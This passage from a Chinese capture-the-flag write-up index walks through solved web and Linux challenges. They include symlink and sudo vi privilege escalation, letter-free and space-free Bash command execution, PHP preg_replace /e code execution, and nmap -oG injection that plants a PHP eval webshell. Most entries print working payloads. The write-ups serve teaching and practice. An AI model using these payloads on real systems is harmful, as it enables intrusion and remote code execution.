\u7a0b\u5e8f\u5728\u4e0d\u5b89\u5168\u7684\u8def\u5f84\u4e0b\u5bfb\u627e <code>.so</code>\uff0c\u53ef\u4ee5\u88ab\u66ff\u6362</p> <p>\u8681\u5251\u8fde\u63a5\u51fa\u9898\u4eba\u7ed9\u51fa\u7684 WebShell</p> <p></p> <p><code>ldd</code> \u7528\u4e8e\u663e\u793a\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u6216\u5171\u4eab\u5e93\u6240\u4f9d\u8d56\u7684\u5171\u4eab\u5e93\uff08\u5373\u52a8\u6001\u94fe\u63a5\u5e93\uff09</p> <p></p> <p>\u8fd9\u6837\u7684\u8bdd\u53ea\u8981\u786e\u8ba4\u4e0b <code>ldd</code> \u4e2d\u52a8\u6001\u5e93\u662f\u5426\u5177\u5907\u6267\u884c\u6743\u9650\uff0c\u662f\u4e00\u4e2a\u7a81\u7834\u53e3</p> <p>\u53d1\u73b0 <code>/lib64/ld-linux-x86-64.so.2</code> \u5177\u6709\u6267\u884c\u6743\u9650</p> <p></p> <p>\u5229\u7528\u8fd9\u4e2a\u6587\u4ef6\u6267\u884c\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter6/6-44/","title":"\u7b26\u53f7\u94fe\u63a5\u63d0\u6743","text":"<p>\u7b26\u53f7\u94fe\u63a5\u63d0\u6743</p> <p>\u5148\u5728\u201c\u6cc4\u9732\u7aef\u53e3\u201d\u7528 <code>nc</code> \u62ff\u5230\u5bc6\u7801</p> <p></p> <p>\u7136\u540e\u56de\u7b54\u95ee\u9898</p> <pre><code>What is the top cyber security conference in the world?\nDEFCON\nthe first hacker ever was known for phreaking(making free phone calls), who was it?\nJohn Draper\n</code></pre> <p>\u53d1\u73b0\u9898\u76ee\u63d0\u793a\u7684\u6a2a\u5e45</p> <pre><code>player@challenge:~$ cat banner  \ncat banner\n*************************************\n**************WELCOME****************\n*************************************\n</code></pre> <p>\u4e0e\u521a\u5f00\u59cb\u5efa\u7acb\u8fde\u63a5\u5bf9\u5e94</p> <p></p> <p>\u627e\u5230 flag\uff0c\u4f46\u662f\u6ca1\u6709\u6743\u9650</p> <pre><code>player@challenge:/root$ ls\nls\nflag.txt  script.py\nplayer@challenge:/root$ ls -l\nls -l\ntotal 8\n-rwx------ 1 root root   46 Mar 12  2024 flag.txt\n-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py\n</code></pre> <p>\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u7528\u7b26\u53f7\u94fe\u63a5\u66ff\u6362\u6389 <code>banner</code>\uff0c\u731c\u6d4b\u521a\u5f00\u59cb\u7684\u6253\u5370\u6267\u884c\u6743\u9650\u662f root</p> <pre><code>player@challenge:/root$ ln -s /root/flag.txt ~/banner\nln -s /root/flag.txt ~/banner\nln: failed to create symbolic link '/home/player/banner': File exists\nplayer@challenge:/root$ rm ~/banner\nrm ~/banner\nplayer@challenge:/root$ ln -s /root/flag.txt ~/banner\nln -s /root/flag.txt ~/banner\n</code></pre> <p>\u91cd\u65b0\u5efa\u7acb\u8fde\u63a5\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter6/6-45/","title":"Bash \u9519\u8bef RCE\uff08\u4ec5\u652f\u6301\u6570\u5b57+\u7b26\u53f7\uff09","text":""},{"location":"Web/Chapter6/6-45/#bash-\u9519\u8bef-rce\u4ec5\u652f\u6301\u6570\u5b57\u7b26\u53f7","title":"Bash \u9519\u8bef RCE\uff08\u4ec5\u652f\u6301\u6570\u5b57+\u7b26\u53f7\uff09","text":"<p>\u5e38\u89c4\u8f93\u5165\u547d\u4ee4\u65e0\u6548</p> <p></p> <p>\u6267\u884c\u65e0\u5b57\u6bcd\u547d\u4ee4\u5e76\u6545\u610f\u6784\u9020\u9519\u8bef</p> <pre><code>$-\n</code></pre> <p></p> <p>\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 <code>$_</code>\u53d8\u91cf\u6765\u8bbf\u95ee\u6700\u540e\u8fd0\u884c\u7684\u547d\u4ee4\u3002\u56e0\u6b64\uff0c\u8981\u8fd0\u884c <code>id</code>\uff0c\u6211\u4eec\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\uff1a</p> <pre><code>\"$($- 2&gt;&amp;1)\"; ${_:7:1}${_:20:1};\n</code></pre> <p>1\ufe0f\u20e3 \u7b2c\u4e00\u4e2a\u90e8\u5206\uff1a<code>\"$($- 2&gt;&amp;1)\"</code></p> <p><code>$()</code>\uff1a\u547d\u4ee4\u66ff\u6362\uff0c\u628a\u62ec\u53f7\u91cc\u7684\u547d\u4ee4\u6267\u884c\u7ed3\u679c\u4f5c\u4e3a\u5b57\u7b26\u4e32\u8fd4\u56de</p> <p><code>$-</code>\uff1a</p> <ul> <li><code>$-</code> \u662f Bash \u5185\u7f6e\u53d8\u91cf\uff0c\u8868\u793a\u5f53\u524d shell \u7684 \u9009\u9879\u6807\u5fd7</li> <li>\u8f93\u51fa\u901a\u5e38\u662f\u7c7b\u4f3c <code>himBH</code> \u8fd9\u6837\u7684\u5b57\u7b26\u4e32\uff08\u8868\u793a shell \u5f00\u542f\u4e86\u54ea\u4e9b\u9009\u9879\uff09</li> </ul> <p><code>2&gt;&amp;1</code>\uff1a\u628a\u6807\u51c6\u9519\u8bef\uff08stderr\uff09\u91cd\u5b9a\u5411\u5230\u6807\u51c6\u8f93\u51fa\uff08stdout\uff09</p> <ul> <li>\u8fd9\u91cc <code>$-</code> \u662f\u6709\u6548\u53d8\u91cf\uff0c\u4e0d\u4f1a\u62a5\u9519\uff0c\u6240\u4ee5\u5b9e\u9645\u4e0a <code>2&gt;&amp;1</code> \u6ca1\u6709\u4f5c\u7528</li> </ul> <p>2\ufe0f\u20e3 \u7b2c\u4e8c\u4e2a\u90e8\u5206\uff1a<code>${_:7:1}${_:20:1}</code></p> <ol> <li><code>${VAR:start:length}</code> \u662f Bash **\u5b50\u4e32\u63d0\u53d6**\u8bed\u6cd5\uff1a</li> <li><code>VAR</code> \u662f\u53d8\u91cf\u540d</li> <li><code>start</code> \u662f\u8d77\u59cb\u7d22\u5f15\uff080 \u5f00\u59cb\uff09</li> <li><code>length</code> \u662f\u957f\u5ea6</li> <li><code>_</code> \u53d8\u91cf\uff1a</li> <li>\u5728 SansAlpha \u4e2d\uff0c\u901a\u5e38\u4f1a\u7528 <code>_=\"$($- 2&gt;&amp;1)\"</code> \u5c06\u9519\u8bef\u8f93\u51fa\u5b58\u5230 <code>_</code> \u91cc</li> <li>\u4f8b\u5982 <code>_=\"bash: himBH: command not found\"</code></li> <li><code>${_:7:1}</code>\uff1a\u63d0\u53d6\u7b2c 8 \u4e2a\u5b57\u7b26\uff08\u7d22\u5f15\u4ece 0 \u5f00\u59cb\uff09\uff0c\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u91cc\u662f <code>h</code></li> <li><code>${_:20:1}</code>\uff1a\u63d0\u53d6\u7b2c 21 \u4e2a\u5b57\u7b26\uff0c\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u91cc\u53ef\u80fd\u662f <code>c</code></li> <li>\u7ec4\u5408\uff1a<code>${_:7:1}${_:20:1}</code> \u2192 \u62fc\u63a5\u5f97\u5230 <code>id</code> \u6216\u8005\u9898\u76ee\u4e2d\u9700\u8981\u7684\u5176\u4ed6\u5b57\u7b26</li> </ol> <p></p> <p>\u7531\u6b64\uff0c\u6211\u4eec\u5f97\u5230 <code>ls</code></p> <pre><code>\"$($- 2&gt;&amp;1)\"; \"$(${_:7:1}${_:20:1})\"; ${_:14:1}${_:47:1}\n</code></pre> <p></p> <p>\u7531\u6b64\uff0c\u6211\u4eec\u5f97\u5230 <code>cat</code> \u548c <code>on-calastran.txt</code></p> <pre><code>\"$($- 2&gt;&amp;1)\"; \"$(${_:7:1}${_:20:1})\"; \"$(${_:14:1}${_:47:1})\"; ${_:10:1}${_:11:1}${_:15:1} ${_:7:16}\n</code></pre> <p></p> <p>\u67e5\u770b <code>blargh</code> \u76ee\u5f55</p> <pre><code>\"$($- 2&gt;&amp;1)\"; \"$(${_:7:1}${_:20:1})\"; \"$(${_:14:1}${_:47:1})\"; \"$(${_:10:1}${_:11:1}${_:15:1} ${_:7:16})\"; ${_:6:1}${_:8:1} ${_:59:1}${_:6:1}${_:5:1}${_:10:1}${_:262:1}${_:1:1}\n</code></pre> <p>\u6700\u540e\u62ff\u5230 flag</p> <pre><code>\"$($- 2&gt;&amp;1)\"; \"$(${_:7:1}${_:20:1})\"; \"$(${_:14:1}${_:47:1})\"; \"$(${_:10:1}${_:11:1}${_:15:1} ${_:7:16})\"; ${_:30:1}${_:5:1}${_:9:1} ${_:59:1}${_:6:1}${_:5:1}${_:10:1}${_:262:1}${_:1:1}/${_:62:1}${_:6:1}${_:5:1}${_:262:1}.${_:9:1}${_:36:1}${_:9:1}\n</code></pre> <p></p>"},{"location":"Web/Chapter6/6-46/","title":"\u4fee\u6539 IFS \u7ed5\u8fc7 Bash \u4e2d\u7981\u7528\u7a7a\u683c","text":""},{"location":"Web/Chapter6/6-46/#\u4fee\u6539-ifs-\u7ed5\u8fc7-bash-\u4e2d\u7981\u7528\u7a7a\u683c","title":"\u4fee\u6539 IFS \u7ed5\u8fc7 Bash \u4e2d\u7981\u7528\u7a7a\u683c","text":"<p>\u6267\u884c\u8fd0\u884c <code>ls</code> \u62a5\u9519\uff0c\u4f7f\u7528 <code>$()</code> \u5305\u88f9</p> <p><code>$(ls)</code> shell \u5c06\u4f7f\u7528 <code>ls</code> \u547d\u4ee4\u7684\u8f93\u51fa\u5e76\u5c06\u5176\u66ff\u6362\u4e3a\u4f60\u7684\u8f93\u5165</p> <p>\u4f8b\u5982\uff0c\u5982\u679c\u4f60\u8fd0\u884c <code>ls</code>\uff0c\u8f93\u51fa\u4e3a <code>file1.txt file2.txt directory1/ directory2/</code></p> <p>\u4f46\u5982\u679c\u4f60\u8fd0\u884c <code>$(ls)</code> \u5219\u76f8\u5f53\u4e8e\u8fd0\u884c <code>file1.txt file2.txt directory1/ directory2/</code></p> <p>\u8fd9\u80af\u5b9a\u610f\u5473\u7740\u5b58\u5728\u4e00\u4e2a\u540d\u4e3a <code>blargh</code> \u7684\u76ee\u5f55</p> <p></p> <p>\u4e0b\u4e00\u6b65\u5e94\u8be5\u770b\u770b\u8fd9\u4e2a\u76ee\u5f55\u540e\u9762\u8fd8\u6709\u4ec0\u4e48\uff0c\u6240\u4ee5\u6211\u8c03\u7528\u4e86 <code>$(ls blargh)</code></p> <p>\u8c03\u7528\u6b64\u547d\u4ee4\u65f6\uff0c\u51fa\u73b0\u4e86\u4e00\u4e2a\u610f\u60f3\u4e0d\u5230\u7684\u8bed\u6cd5\u9519\u8bef</p> <p>\u6211\u5c1d\u8bd5\u4e86\u5176\u4ed6\u51e0\u4e2a\u547d\u4ee4\uff0c\u53d1\u73b0 Special \u63a5\u53e3\u4e0d\u5141\u8bb8\u547d\u4ee4\u4e4b\u95f4\u7528\u7a7a\u683c\u5206\u9694</p> <p>\u7ed5\u8fc7\u65b9\u6cd5\u662f\u4fee\u6539\u5185\u90e8\u5b57\u6bb5\u5206\u9694\u7b26\uff08IFS\uff09\uff0c\u8be5\u53d8\u91cf\u5b9a\u4e49\u7528\u4e8e\u5c06\u6a21\u5f0f\u5206\u9694\u4e3a\u6807\u8bb0\u7684\u5b57\u7b26</p> <p>\u6211\u51b3\u5b9a\u5c06\u5176\u4ece\u7a7a\u683c\u6539\u4e3a <code>]</code></p> <pre><code>$(IFS=];b=ls]blargh;$b)\n</code></pre> <p>\u5f97\u5230\u8f93\u51fa</p> <pre><code>flag.txt not found\n</code></pre> <p>\u4f7f\u7528 <code>cat</code> \u6211\u4eec\u8fd0\u884c</p> <pre><code>$(IFS=];b=cat]blargh/flag.txt;$b)\n</code></pre>"},{"location":"Web/Chapter6/6-47/","title":"sudo vi \u63d0\u6743","text":""},{"location":"Web/Chapter6/6-47/#sudo-vi-\u63d0\u6743","title":"sudo vi \u63d0\u6743","text":"<p>\u5148\u68c0\u67e5\u6709\u54ea\u4e9b\u6743\u9650</p> <pre><code>sudo -l\n</code></pre> <p>\u6211\u4eec\u62e5\u6709 vi \u6587\u672c\u7f16\u8f91\u5668\u7684 sudo \u6743\u9650\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u4ee5 root \u8eab\u4efd\u5728\u4efb\u4f55\u6587\u4ef6\u4e0a\u8fd0\u884c vi</p> <p></p> <p>\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f7f\u7528 vi \u5728\u5f53\u524d\u76ee\u5f55\u4e2d\u521b\u5efa\u4e86\u81ea\u5df1\u7684\u6587\u4ef6\u5e76\u521b\u5efa\u65b0 shell</p> <p></p> <p>\u63d0\u6743\u6210\u529f\uff01</p> <p></p>"},{"location":"Web/Chapter6/6-5/","title":"$IFS$num \u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-5/#ifsnum-\u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7","title":"\\(IFS\\)num \u4ee3\u66ff\u7a7a\u683c\u7ed5\u8fc7","text":"<p>\u901a\u7528\u662f Ping \u7684\u56de\u663e</p> <p></p> <p>\u901a\u8fc7\u6d4b\u8bd5\u53d1\u73b0\u8fc7\u6ee4\u4e86\u7a7a\u683c\u4ee5\u53ca\u4e00\u4e9b\u7b26\u53f7\u548c flag\uff0c\u4f46\u662f $IFS \u53ef\u4ee5\u4f7f\u7528</p> <p>$IFS \u5728 Linux \u4e0b\u8868\u793a\u5206\u9694\u7b26</p> <p>\u4f46\u662f\u5982\u679c\u5355\u7eaf\u7684 cat$IFS9\uff0cbash \u89e3\u91ca\u5668\u4f1a\u628a\u6574\u4e2a IFS9 \u5f53\u505a\u53d8\u91cf\u540d\uff0c\u5bfc\u81f4\u8f93\u4e0d\u51fa\u6765\u7ed3\u679c</p> <p>\u6240\u4ee5\u8981\u52a0\u4e00\u4e2a $ \u53d8\u6210 $9\uff0c\u8fd9\u91cc\u4efb\u4f55\u6570\u5b57\u90fd\u53ef\u4ee5\u7ed5\u8fc7</p> <p>\u8fde\u63a5\u5728\u4e00\u8d77\u76f8\u5f53\u4e8e\u5728\u811a\u672c\u4e2d\u4f7f\u7528\u7279\u5b9a\u7684\u5b57\u6bb5\u5206\u9694\u7b26\u5e76\u8bbf\u95ee\u547d\u4ee4\u884c\u53c2\u6570\u4e2d\u7684\u7279\u5b9a\u5b57\u6bb5</p> <p></p>"},{"location":"Web/Chapter6/6-6/","title":"preg_replace() /e \u4fee\u9970\u7b26 RCE \u7ed5\u8fc7 foreach","text":""},{"location":"Web/Chapter6/6-6/#preg_replace-e-\u4fee\u9970\u7b26-rce-\u7ed5\u8fc7-foreach","title":"preg_replace() /e \u4fee\u9970\u7b26 RCE \u7ed5\u8fc7 foreach","text":"<p>\u6253\u5f00\u7f51\u9875\u7ed9\u51fa\u4e86\u6e90\u7801</p> <p></p> <p>\u8981\u4f20\u53c2 $text \u662f\u4e2a\u6587\u4ef6\uff0c\u800c\u4e14\u6587\u4ef6\u5185\u5bb9\u662f I have\u2026\u2026</p> <p>\u8fd9\u91cc\u53ef\u4ee5\u8054\u60f3\u5230 PHP \u4f2a\u534f\u8bae input\uff0c\u5176 POST \u7684\u503c\u662f I have\u2026\u2026 \u5373\u53ef\u7ed5\u8fc7\uff08data \u4e5f\u53ef\u4ee5\uff09</p> <p>$file \u6700\u540e\u662f\u6587\u4ef6\u5305\u542b\uff0c\u4e5f\u662f\u8981\u4f20\u6587\u4ef6\u540d\u7684</p> <p>\u8054\u60f3\u5230\u53e6\u4e00\u4e2a PHP \u4f2a\u534f\u8bae filter\uff0c\u6ce8\u91ca\u8868\u660e\u4e86\u4e00\u4e2a\u6587\u4ef6\uff0c\u6784\u9020 payload \u6267\u884c</p> <p></p> <p>\u89e3\u7801\u62ff\u5230\u6587\u4ef6\u6e90\u7801</p> <pre><code>&lt;?php\n$id = $_GET['id'];\n$_SESSION['id'] = $id;\n\nfunction complex($re, $str) {\n    return preg_replace(\n        '/(' . $re . ')/ei',\n        'strtolower(\"\\\\1\")',\n        $str\n    );\n}\n\n\nforeach($_GET as $re =&gt; $str) {\n    echo complex($re, $str). \"\\n\";\n}\n\nfunction getFlag(){\n    @eval($_GET['cmd']);\n}\n</code></pre> <p>\u5c06\u6240\u6709 GET \u53c2\u6570\u7684\u201c\u952e\u201d\u5f53\u4f5c <code>$re</code> \u6b63\u5219\u6a21\u5f0f\uff0c\u201c\u503c\u201d\u5f53\u4f5c <code>$str</code> \u5f85\u5904\u7406\u6587\u672c\uff0c\u9010\u4e00\u8c03\u7528 <code>complex()</code></p> <pre><code>foreach($_GET as $re =&gt; $str) {\n    echo complex($re, $str). \"\\n\";\n}\n</code></pre> <p>preg_replace \u7528\u4e8e\u8fdb\u884c\u6b63\u5219\u8868\u8fbe\u5f0f\u66ff\u6362\u7684\u51fd\u6570</p> <p>\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8981\u5339\u914d\u7684\u6b63\u5219\u8868\u8fbe\u5f0f\u6a21\u5f0f\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u7528\u4e8e\u66ff\u6362\u7684\u5185\u5bb9\uff0c\u7b2c\u4e09\u4e2a\u662f\u8981\u8fdb\u884c\u66ff\u6362\u7684\u8f93\u5165\u5b57\u7b26\u4e32</p> <p></p> <p>\u8fd9\u6bb5\u4ee3\u7801\u7684\u4f5c\u7528\u662f\uff1a\u5728\u5b57\u7b26\u4e32 <code>$str</code> \u4e2d\u67e5\u627e\u5339\u914d\u6b63\u5219\u8868\u8fbe\u5f0f <code>($re)</code> \u7684\u90e8\u5206\uff0c\u5c06\u5339\u914d\u5230\u7684\u5185\u5bb9\u8f6c\u6362\u4e3a\u5c0f\u5199\u5f62\u5f0f</p> <ul> <li><code>/e</code> \u4fee\u9970\u7b26\uff1a\u8868\u793a\u5c06\u66ff\u6362\u5b57\u7b26\u4e32\u4f5c\u4e3a PHP \u4ee3\u7801\u6267\u884c</li> <li><code>/i</code> \u4fee\u9970\u7b26\uff1a\u8868\u793a\u6b63\u5219\u5339\u914d\u4e0d\u533a\u5206\u5927\u5c0f\u5199</li> </ul> <p>\u56e0\u6b64\uff0c<code>strtolower(\"\\\\1\")</code> \u4f1a\u5c06\u7b2c\u4e00\u4e2a\u6355\u83b7\u7ec4\uff08\u5373\u5339\u914d\u7684\u5185\u5bb9\uff09\u8f6c\u6362\u4e3a\u5c0f\u5199</p> <pre><code>preg_replace(\n    '/(' . $re . ')/ei',\n    'strtolower(\"\\\\1\")',\n    $str\n);\n\n# $re = 'HELLO'\n# $str = 'Hello World!'\n# \u8f93\u51fa\uff1ahello World!\n</code></pre> <p>\u73b0\u5728\u518d\u6765\u770b\u6e90\u4ee3\u7801\u591a\u4e86\u4e2a <code>ei</code>\uff0c<code>e</code> \u4fee\u9970\u7b26\u4f1a\u5bfc\u81f4\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u66ff\u6362\u90e8\u5206 <code>strtolower(\"\\\\1\")</code> \u88ab\u5f53\u4f5c PHP \u4ee3\u7801\u6267\u884c</p> <p><code>i</code> \u4fee\u9970\u7b26\u4e0d\u533a\u5206\u5927\u5c0f\u5199\uff0c\u76f8\u5f53\u4e8e <code>eval('strtolower(\"\\\\1\");')</code></p> <p>\u5f53 \\1 \u662f\u6211\u4eec\u4f20\u8fdb\u53bb\u7684 <code>{${phpinfo()}}</code> \u65f6\uff0c\u5176\u5b9e\u5c31\u662f <code>eval('strtolower(\"{${phpinfo()}}\");')</code></p> <p>\u4f46\u662f\u6211\u4eec\u4e3a\u4ec0\u4e48\u8981\u4f20\u5165 <code>{${phpinfo()}}</code> \u5462\uff1f</p> <p><code>${phpinfo()}</code> \u4e2d\u7684 <code>phpinfo()</code> \u4f1a\u88ab\u5f53\u4f5c\u53d8\u91cf\u5148\u6267\u884c\uff0c\u6267\u884c\u540e\u53d8\u6210 <code>${1}</code></p> <p>1 \u662f\u56e0\u4e3a <code>phpinfo()</code> \u6210\u529f\u6267\u884c\u540e\u8fd4\u56de true\uff0c\u800c <code>strtolower(\"{${1}}\")</code> \u53c8\u76f8\u5f53\u4e8e\u7a7a\u5b57\u7b26\u4e32</p> <p>\u6240\u4ee5\u5173\u952e\u5728\u4e8e preg_match \u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5148\u88ab\u5f53\u4f5c\u53d8\u91cf\u6267\u884c\u4e86\uff0c\u8fbe\u5230\u547d\u4ee4\u6267\u884c\u7684\u6548\u679c</p> <p></p> <p>\u4e0a\u9762\u7684 preg_replace \u8bed\u53e5\u5982\u679c\u76f4\u63a5\u5199\u5728\u7a0b\u5e8f\u91cc\u9762\uff0c\u5f53\u7136\u53ef\u4ee5\u6210\u529f\u6267\u884c <code>phpinfo()</code></p> <p>\u901a\u8fc7 GET \u4f20\u53c2\u6784\u9020 payload\uff0c\u5728 = \u53f7\u5de6\u8fb9\u4f20\u7684\u662f\u5339\u914d\u6a21\u5f0f\uff0c\u53f3\u8fb9\u662f\u8981\u8c03\u7528\u7684\u51fd\u6570\u6216\u547d\u4ee4</p> <p>\u7136\u800c\u4f20\u5165 <code>.*</code> \u5374\u76f4\u63a5\u62a5\u9519 </p> <p></p> <p>\u5f53\u975e\u6cd5\u5b57\u7b26\u4e3a\u9996\u5b57\u6bcd\u65f6\uff0c\u53ea\u6709\u70b9\u53f7\u4f1a\u88ab\u66ff\u6362\u6210\u4e0b\u5212\u7ebf\u62a5\u9519\uff0c\u9700\u8981\u7ed5\u8fc7\u8fd9\u4e00\u6b65</p> <p><code>\\S</code> \u5339\u914d\u6240\u6709\u975e\u7a7a\u767d\u7b26\u4e0d\u5305\u62ec\u6362\u884c\uff0c\u52a0\u4e2a <code>*</code> \u5339\u914d\u591a\u4e2a</p> <p>\u518d\u8ddf\u4e0a <code>${eval($_POST[cmd])}</code>\uff0c\u518d\u4f20\u53c2 <code>cmd=system(\"cat /flag\");</code></p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter6/6-7/","title":"escapeshellarg/cmd RCE","text":""},{"location":"Web/Chapter6/6-7/#escapeshellargcmd-rce","title":"escapeshellarg/cmd RCE","text":"<p>\u6253\u5f00\u7f51\u9875\u62ff\u5230\u6e90\u7801</p> <p></p> <p>\u4f20\u5165\u7684\u53c2\u6570\u662f\uff1a172.17.0.2' -v -d a=1</p> <p>\u7ecf\u8fc7 escapeshellarg \u5904\u7406\u540e\u53d8\u6210\u4e86 '172.17.0.2 '\\'' -v -d a=1'</p> <p>\u5373\u5148\u5bf9\u5355\u5f15\u53f7\u8f6c\u4e49\uff0c\u518d\u7528\u5355\u5f15\u53f7\u5c06\u5de6\u53f3\u4e24\u90e8\u5206\u62ec\u8d77\u6765\u4ece\u800c\u8d77\u5230\u8fde\u63a5\u7684\u4f5c\u7528</p> <p>\u7ecf\u8fc7 escapeshellcmd \u5904\u7406\u540e\u53d8\u6210 '172.17.0.2 '\\\\'' -v -d a=1\\'</p> <p>\u8fd9\u662f\u56e0\u4e3a escapeshellcmd \u5bf9  \u4ee5\u53ca\u6700\u540e\u90a3\u4e2a\u4e0d\u914d\u5bf9\u513f\u7684\u5f15\u53f7\u8fdb\u884c\u4e86\u8f6c\u4e49</p> <p>\u6700\u540e\u6267\u884c\u7684\u547d\u4ee4\u662f curl '172.17.0.2 '\\\\'' -v -d a=1\\'</p> <p>\u7531\u4e8e\u4e2d\u95f4\u7684 \\ \u88ab\u89e3\u91ca\u4e3a  \u800c\u4e0d\u518d\u662f\u8f6c\u4e49\u5b57\u7b26\uff0c\u6240\u4ee5\u540e\u9762\u7684 ' \u6ca1\u6709\u88ab\u8f6c\u4e49\uff0c\u4e0e\u518d\u540e\u9762\u7684 ' \u914d\u5bf9\u513f\u6210\u4e86\u4e00\u4e2a\u7a7a\u767d\u8fde\u63a5\u7b26</p> <p>\u5373\u5411 172.17.0.2 \u53d1\u8d77\u8bf7\u6c42\uff0cPOST \u6570\u636e\u4e3a a=1</p> <p>\u6240\u4ee5\u7ecf\u8fc7\u6211\u4eec\u6784\u9020\u4e4b\u540e\uff0c\u8f93\u5165\u7684\u503c\u88ab\u5206\u5272\u6210\u4e3a\u4e86\u4e09\u90e8\u5206</p> <p>\u7b2c\u4e00\u90e8\u5206\u5c31\u662fcurl\u7684IP\uff0c\u4e3a172.17.0.2\\</p> <p>\u7b2c\u4e8c\u90e8\u5206\u5c31\u662f\u4e24\u4e2a\u914d\u5bf9\u7684\u5355\u5f15\u53f7 ' '</p> <p>\u7b2c\u4e09\u90e8\u5206\u5c31\u662f\u547d\u4ee4\u53c2\u6570\u4ee5\u53ca\u5bf9\u8c61 -v -d a=1'</p> <p>nmap \u6709\u4e00\u4e2a\u53c2\u6570 -oG \u53ef\u4ee5\u5b9e\u73b0\u5c06\u547d\u4ee4\u548c\u7ed3\u679c\u5199\u5230\u6587\u4ef6</p> <p>\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u81ea\u5df1\u7684\u8f93\u5165\u5199\u5165\u6587\u4ef6\uff0c\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u5199\u5165\u4e00\u53e5\u8bdd\u6728\u9a6c\u94fe\u63a5\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u547d\u4ee4 cat flag</p> <pre><code>?host=' &lt;?php eval($_POST[\"hack\"]);?&gt; -oG hack.php '\n</code></pre> <p></p> <p>\u8bb0\u5f55\u4e0b\u5b83\u751f\u6210\u7684\u6587\u4ef6\u5939\u540d</p> <p></p> <p>\u6253\u5f00\u8681\u5251\u8fdc\u7a0b\u8fde\u63a5</p> <p></p> <p>\u6210\u529f\u62ff\u5230 flag</p> <p></p>"},{"location":"Web/Chapter6/6-8/","title":"PHP \u51fd\u6570\u5d4c\u5957\u7ed5\u8fc7","text":""},{"location":"Web/Chapter6/6-8/#php-\u51fd\u6570\u5d4c\u5957\u7ed5\u8fc7","title":"PHP \u51fd\u6570\u5d4c\u5957\u7ed5\u8fc7","text":"<p>\u6253\u5f00\u7f51\u9875\u5565\u4e5f\u4e0d\u662f</p> <p></p> <p>\u626b\u63cf\u540e\u53f0\u53d1\u73b0 git \u6cc4\u9732</p> <p></p> <p>\u4f7f\u7528 GitHack.py \u4e0b\u8f7d\u6587\u4ef6</p> <p></p> <p>\u62ff\u5230\u6e90\u7801\u4e00\u987f\u5206\u6790\uff0c\u9996\u5148\u662f\u8fc7\u6ee4\u4e86\u4f2a\u534f\u8bae\uff0c\u7b2c\u4e8c\u662f\u5339\u914d\u4ee5\u5b57\u6bcd\u6216\u4e0b\u5212\u7ebf\u5f00\u5934\u7684\u51fd\u6570\u8c03\u7528</p> <p>(?R) \u662f\u9012\u5f52\u6a21\u5f0f\uff0c\u7528\u4e8e\u5339\u914d\u5d4c\u5957\u51fd\u6570\u8c03\u7528\uff0c\u6700\u540e\u8fc7\u6ee4\u4e86\u4e00\u4e9b\u5173\u952e\u5b57</p> <pre><code>&lt;?php\ninclude \"flag.php\";\necho \"flag\u5728\u54ea\u91cc\u5462\uff1f&lt;br&gt;\";\nif(isset($_GET['exp'])){\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) {\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {\n            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {\n                // echo $_GET['exp'];\n                @eval($_GET['exp']);\n            }\n            else{\n                die(\"\u8fd8\u5dee\u4e00\u70b9\u54e6\uff01\");\n            }\n        }\n        else{\n            die(\"\u518d\u597d\u597d\u60f3\u60f3\uff01\");\n        }\n    }\n    else{\n        die(\"\u8fd8\u60f3\u8bfbflag\uff0c\u81ed\u5f1f\u5f1f\uff01\");\n    }\n}\n// highlight_file(__FILE__);\n?&gt;\n</code></pre> <p>\u9700\u8981\u4e86\u89e3\u51e0\u4e2a\u51fd\u6570</p> <p>scandir() \u8fd4\u56de\u6307\u5b9a\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u548c\u76ee\u5f55\u7684\u6570\u7ec4</p> <p>localeconv() \u51fd\u6570\u8fd4\u56de\u4e00\u4e2a\u5305\u542b\u672c\u5730\u6570\u5b57\u53ca\u8d27\u5e01\u683c\u5f0f\u4fe1\u606f\u7684\u6570\u7ec4\uff0c\u76f8\u5f53\u4e8e ls</p> <p>current() \u8fd4\u56de\u6570\u7ec4\u4e2d\u5f53\u524d\u5143\u7d20\u7684\u503c\uff08\u4e5f\u53ef\u4ee5\u66ff\u6362\u4e3a pos()\uff09</p> <p>\u6700\u540e print_r \u6253\u5370\u51fa\u6765\u53d1\u73b0 flag.php</p> <pre><code>print_r(scandir(current(localeconv())));\n</code></pre> <p></p> <p>\u5f53\u7136\u4e5f\u53ef\u4ee5\u76f4\u63a5</p> <pre><code>var_dump(scandir('.'));\n</code></pre> <p></p> <p>\u63a5\u4e0b\u6765\u5148\u5148\u4f7f\u7528 array_reverse() \u53cd\u8f6c\uff0c\u518d\u63a5\u4e0a next() \u8df3\u5230\u7b2c\u4e8c\u4e2a\u5373 flag.php</p> <p>\u6700\u540e\u5916\u9762\u5957\u4e00\u4e2a\u9ad8\u4eae\u663e\u793a\u62ff\u5230 flag</p> <pre><code>?exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));\n</code></pre> <p></p> <p>\u6216\u8005</p> 